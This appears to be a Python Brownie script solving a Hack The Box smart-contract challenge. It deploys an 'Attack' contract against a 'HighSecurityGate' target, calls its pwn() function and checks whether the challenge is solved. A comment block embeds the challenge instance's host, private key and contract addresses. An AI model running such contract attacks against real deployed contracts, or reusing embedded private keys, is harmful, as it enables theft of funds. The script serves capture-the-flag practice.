#!/usr/bin/python3
from brownie import Attack, HighSecurityGate, Setup, web3
from colorama import Fore

from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# https://cmichel.io/ethernaut-solutions/

"""
brownie networks add Ethereum HTB host=http://138.68.154.161:31180 chainid=1337

Private key     :  0x39f1b3e3157a72101e884e810c004f6ed52e41e6fa1cb0d74da781390c2191c7
Address         :  0xa6Da6d2690e27c268207054817fC162174459A65
Target contract :  0xbabf9efC5589A03D548aF63d813758Ac2A252Ad5
Setup contract  :  0xcf102FB2Ab32fd9868642a4a963b1FDDE7758528
"""

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

def hack(contract_address=None, attacker=None):
    if not contract_address:
        hs, st, owner = deploy()
        # contract_address = un.address
        #print(contract_address, owner)
        _, attacker = get_account()
    else:
        hs = HighSecurityGate.at("0xbabf9efC5589A03D548aF63d813758Ac2A252Ad5")
        st = Setup.at("0xcf102FB2Ab32fd9868642a4a963b1FDDE7758528")

    #print(hs.enter({"from": attacker, "allow_revert": True}))
    # tx = un.updateSensors(10, {"from": attacker})
    # tx.wait(1)
    target_contract = hs.address
    print(attacker.balance())
    # for i in range(5):
    #     print(web3.eth.get_storage_at(contract_address, i))
    # print(f"{green}Update Sensors: {red}{un.updated()}")
    # print(f"{green}Solved: {red}{st.isSolved()}{reset}")

    my_contract = Attack.deploy(target_contract, {"from": attacker})
    #print(my_contract.name())
    print(hs.lastEntrant())
    # hack
    my_contract.pwn()
    # print(hs.lastEntrant())

    #print(target_contract.strcmp(target_contract.lastEntrant(), "Pandora".encode()))
    
    print(st.isSolved())
    
    

def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()

if __name__ == '__main__':
    main()